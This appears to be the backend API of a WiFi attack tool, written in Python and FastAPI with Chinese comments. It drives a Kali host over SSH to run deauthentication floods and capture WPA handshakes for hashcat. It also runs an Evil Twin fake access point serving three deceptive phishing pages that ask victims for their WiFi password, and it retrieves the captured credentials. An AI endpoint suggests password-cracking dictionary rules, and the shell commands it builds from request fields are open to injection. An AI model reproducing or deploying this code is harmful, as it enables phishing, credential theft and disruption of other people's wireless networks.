from fastapi import APIRouter, HTTPException
from fastapi.responses import FileResponse
from pydantic import BaseModel
from app.modules.ai_agent.service import ai_service
from app.core.ssh_manager import ssh_client
import os
import time
import json
from pathlib import Path

router = APIRouter()


# ==========================================
# 1. 请求模型定义
# ==========================================
class AttackRequest(BaseModel):
    bssid: str
    interface: str = "wlan0"  # 攻击卡 (Deauth)
    channel: str = "1"
    duration: int = 60

    # --- Evil Twin 专用参数 ---
    ap_interface: str = "wlan1"  # AP卡 (Hotspot)
    ssid: str = "Free_WiFi"
    template_html: str = ""  # 钓鱼HTML内容


class AIAnalysisRequest(BaseModel):
    ssid: str
    encryption: str
    bssid: str


# ==========================================
# 2. 辅助工具
# ==========================================
def find_payload_script(script_name: str):
    """自动查找 kali_payloads 目录下的脚本"""
    current_file = Path(__file__).resolve()
    # 向上寻找项目根目录
    for parent in current_file.parents:
        potential_path = parent / "kali_payloads" / script_name
        if potential_path.exists():
            return str(potential_path)
    return None


# ==========================================
# 3. 基础功能: 文件下载
# ==========================================
@router.get("/download/{filename}")
async def download_file(filename: str):
    """下载 captures 目录下的文件"""
    if ".." in filename or "/" in filename:
        raise HTTPException(400, "Invalid filename")

    # 尝试多个路径查找
    possible_paths = [
        Path.cwd() / "captures" / filename,
        Path(__file__).resolve().parents[4] / "captures" / filename
    ]

    file_path = None
    for p in possible_paths:
        if p.exists():
            file_path = p
            break

    if not file_path:
        raise HTTPException(404, "File not found")

    return FileResponse(path=file_path, filename=filename, media_type='application/octet-stream')


# ==========================================
# 4. 攻击功能: Deauth
# ==========================================
@router.post("/deauth")
async def start_deauth_attack(req: AttackRequest):
    if not ssh_client.client:
        try:
            ssh_client.connect()
        except Exception as e:
            raise HTTPException(500, f"SSH连接失败: {str(e)}")

    script_name = "attack_worker.py"
    local_path = find_payload_script(script_name)
    if not local_path: raise HTTPException(500, f"缺失 {script_name}")

    try:
        remote_path = ssh_client.upload_payload(local_path, script_name)
        duration = int(req.duration)
        cmd = f"nohup python3 {remote_path} deauth --bssid {req.bssid} --interface {req.interface} --channel {req.channel} --duration {duration} > /tmp/attack_deauth.log 2>&1 &"
        ssh_client.exec_command(cmd)
        return {"status": "started", "msg": "Deauth 攻击已启动", "log": "/tmp/attack_deauth.log"}
    except Exception as e:
        raise HTTPException(500, f"执行异常: {str(e)}")


# ==========================================
# 5. 攻击功能: 握手包捕获
# ==========================================
@router.post("/handshake")
async def start_handshake_capture(req: AttackRequest):
    if not ssh_client.client: ssh_client.connect()

    script_name = "attack_worker.py"
    local_path = find_payload_script(script_name)
    if not local_path: raise HTTPException(500, f"本地找不到 {script_name}")

    remote_path = ssh_client.upload_payload(local_path, script_name)

    # 阻塞执行
    cmd = f"python3 {remote_path} handshake --bssid {req.bssid} --interface {req.interface} --channel {req.channel} --duration {req.duration}"

    try:
        stdin, stdout, stderr = ssh_client.exec_command(cmd)
        output = stdout.read().decode()

        response_data = {"status": "failed", "msg": "未捕获到握手包", "debug": output}

        # 确定本地保存目录
        local_dir = Path.cwd() / "captures"
        if not local_dir.exists(): local_dir.mkdir(exist_ok=True)

        # 下载 .cap / .pcap
        if "CAPTURED_HS_POTENTIAL" in output:
            ts = int(time.time())
            remote_prefix = f"/tmp/handshake_{req.bssid.replace(':', '')}"

            # 尝试下载 .cap, .pcap, .hc22000
            for ext in ['.cap', '.pcap']:
                remote_file = f"{remote_prefix}-01{ext}"
                local_file = f"handshake_{req.bssid.replace(':', '')}_{ts}{ext}"

                # 检查远程是否存在
                _in, _out, _err = ssh_client.exec_command(f"ls {remote_file}")
                if not _err.read():
                    if ssh_client.download_file(remote_file, str(local_dir / local_file)):
                        response_data["status"] = "success"
                        response_data["msg"] = "成功捕获握手包"
                        response_data["cap_file"] = local_file
                        break

            # 下载 Hashcat 文件
            remote_hc = f"{remote_prefix}.hc22000"
            local_hc = f"handshake_{req.bssid.replace(':', '')}_{ts}.hc22000"
            _in, _out, _err = ssh_client.exec_command(f"ls {remote_hc}")
            if not _err.read():
                if ssh_client.download_file(remote_hc, str(local_dir / local_hc)):
                    response_data["hash_file"] = local_hc

        return response_data
    except Exception as e:
        return {"status": "error", "msg": str(e)}


# ==========================================
# 6. AI 功能
# ==========================================
@router.post("/ai/analyze_target")
async def analyze_target(req: AIAnalysisRequest):
    try:
        raw = ai_service.analyze_wifi_target(req.ssid, req.encryption, "Unknown")
        if isinstance(raw, dict) and "risk_level" in raw: return raw
        return {
            "risk_level": "中 (Medium)",
            "summary": "AI 服务暂未返回标准数据。",
            "advice": "目标使用 WPA/WPA2 加密。建议尝试捕获握手包。",
            "dict_rules": ["纯数字", "手机号段"]
        }
    except Exception as e:
        return {"risk_level": "Unknown", "summary": "Error", "advice": str(e), "dict_rules": []}


# ==========================================
# 7. 🔥 Evil Twin (双子攻击) - 完整版
# ==========================================

# A. 获取预置模板
@router.get("/eviltwin/templates")
async def get_phishing_templates():
    """返回预置的钓鱼页面模板"""
    templates = [
        {
            "name": "通用中文认证 (Generic CN)",
            "content": """<html><head><meta name="viewport" content="width=device-width,initial-scale=1"><meta charset="utf-8"></head><body style="background:#f5f5f5;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0"><div style="background:#fff;padding:20px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);width:85%;max-width:320px;text-align:center"><h3 style="margin-top:0">安全检测</h3><p style="font-size:14px;color:#666">为了保障您的网络安全，系统检测到异常活动。请验证 WiFi 密码以继续连接。</p><form method="POST"><input name="password" type="password" placeholder="输入 WiFi 密码" required style="width:100%;padding:10px;margin:10px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box"><button style="width:100%;padding:10px;background:#007bff;color:#fff;border:none;border-radius:4px;cursor:pointer">立即验证</button></form></div></body></html>"""
        },
        {
            "name": "路由器固件升级 (Firmware Upgrade)",
            "content": """<html><head><meta charset="utf-8"></head><body style="padding:50px;text-align:center;font-family:Arial"><h2>路由器固件升级通知</h2><p>您的路由器固件版本过低，需要验证管理员密码(WiFi密码)以安装安全补丁。</p><form method="POST"><input type="password" name="password" placeholder="WiFi Password"><br><br><button>开始升级</button></form></body></html>"""
        },
        {
            "name": "星巴克风格 (Coffee Shop)",
            "content": """<html><body style="background:#006241;color:white;text-align:center;padding-top:50px"><h1>Free WiFi</h1><p>Welcome! Please login to connect.</p><form method="POST"><input type="password" name="password" placeholder="WiFi Password" style="padding:10px"><br><br><button style="padding:10px 20px">Connect</button></form></body></html>"""
        }
    ]
    return {"status": "success", "data": templates}


# B. 启动攻击
@router.post("/eviltwin/start")
async def start_evil_twin(req: AttackRequest):
    """
    启动双子攻击：
    1. req.interface -> Deauth 攻击
    2. req.ap_interface -> Fake AP + Phishing
    """
    if req.interface == req.ap_interface:
        raise HTTPException(400, "错误：攻击网卡和 AP 网卡不能是同一个！请插入两张网卡。")

    if not ssh_client.client: ssh_client.connect()

    # 上传 Evil Twin 脚本
    et_script = "eviltwin_worker.py"
    local_et = find_payload_script(et_script)
    if not local_et: raise HTTPException(500, f"找不到 {et_script}")
    remote_et = ssh_client.upload_payload(local_et, et_script)

    # 上传 Deauth 脚本
    deauth_script = "attack_worker.py"
    local_deauth = find_payload_script(deauth_script)
    if not local_deauth: raise HTTPException(500, f"找不到 {deauth_script}")
    remote_deauth = ssh_client.upload_payload(local_deauth, deauth_script)

    try:
        # 处理 HTML (防止引号破坏命令)
        clean_html = req.template_html.replace('"', '\\"').replace('`', '\\`')

        # 1. 启动 Fake AP (后台)
        print(f"[*] Starting Evil Twin on {req.ap_interface} with SSID: {req.ssid}")
        et_cmd = f"nohup python3 {remote_et} --interface {req.ap_interface} --ssid '{req.ssid}' --channel {req.channel} --template \"{clean_html}\" > /tmp/eviltwin.log 2>&1 &"
        ssh_client.exec_command(et_cmd)

        # 2. 启动 Deauth 攻击 (后台)
        print(f"[*] Starting Deauth Flood on {req.interface} -> {req.bssid}")
        deauth_cmd = f"nohup python3 {remote_deauth} deauth --bssid {req.bssid} --interface {req.interface} --channel {req.channel} --duration {req.duration} > /tmp/et_deauth.log 2>&1 &"
        ssh_client.exec_command(deauth_cmd)

        return {
            "status": "started",
            "msg": "双子攻击已启动！请等待用户连接钓鱼热点。",
            "details": {
                "ap_interface": req.ap_interface,
                "deauth_interface": req.interface,
                "ssid": req.ssid,
                "logs": ["/tmp/eviltwin.log", "/tmp/et_deauth.log"]
            }
        }

    except Exception as e:
        raise HTTPException(500, f"启动失败: {str(e)}")


# C. 停止攻击
@router.post("/eviltwin/stop")
async def stop_evil_twin():
    """停止所有攻击并恢复网络"""
    if not ssh_client.client: ssh_client.connect()
    try:
        ssh_client.exec_command("pkill -f eviltwin_worker.py")
        ssh_client.exec_command("pkill -f attack_worker.py")
        ssh_client.exec_command("killall hostapd dnsmasq aireplay-ng")
        ssh_client.exec_command("iptables --flush && iptables -t nat --flush")
        return {"status": "success", "msg": "Evil Twin 攻击已停止，环境已清理。"}
    except Exception as e:
        return {"status": "error", "msg": str(e)}


# D. 获取凭证
@router.get("/eviltwin/credentials")
async def get_credentials():
    """获取钓鱼捕获到的密码"""
    if not ssh_client.client: ssh_client.connect()
    try:
        stdin, stdout, stderr = ssh_client.exec_command("cat /tmp/eviltwin/captured_creds.txt")
        data = stdout.read().decode()

        if not data: return {"status": "waiting", "data": []}

        creds = []
        for line in data.splitlines():
            if line.strip(): creds.append(line.strip())

        return {"status": "success", "data": creds}
    except Exception:
        return {"status": "empty", "data": []}